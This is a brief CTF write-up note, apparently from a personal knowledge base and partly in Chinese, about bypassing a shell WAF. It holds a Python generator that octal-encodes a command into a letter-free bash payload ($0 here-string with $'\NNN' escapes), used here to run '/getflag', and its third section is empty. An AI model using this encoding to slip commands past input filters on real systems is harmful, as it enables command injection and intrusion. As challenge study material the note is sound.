tags:: CTF/Shell/利用进制转换构造无字母payload, CTF/Shell/WAF绕过

- # 1&2
	- ```python
	  
	  def zero_str():
	      return "$0"
	  
	  def num(n: int):
	      return str(n)
	  
	  def string(s: str):
	      return "$'" + "".join(
	          ["\\" + num(int(oct(ord(c))[2:]))
	              for c in s]
	      ) + "'"
	  
	  def payload(cmd):
	      return "{zero}<<<{zero}\\<\\<\\<{cmd}".format(
	          zero = zero_str(),
	          cmd = string(cmd)
	      )
	  
	  p = string("/getflag")
	  print(p)
	  ```
	- 把p交上去就行，注意转义
	- 参考[[CTF/Shell/利用进制转换构造无字母payload]]
- # 3
	-